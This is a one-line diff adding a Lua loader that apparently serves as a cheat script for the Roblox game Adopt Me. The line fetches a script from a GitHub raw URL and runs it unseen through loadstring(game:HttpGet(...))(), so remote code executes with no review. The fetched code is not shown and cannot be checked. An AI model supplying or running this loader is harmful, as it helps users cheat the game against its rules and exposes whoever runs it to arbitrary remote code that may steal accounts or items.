@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Adopt-Me-Scripts/AdoptmeScript/main/AdoptmeScript/S532R95-adopt-me.lua"))()
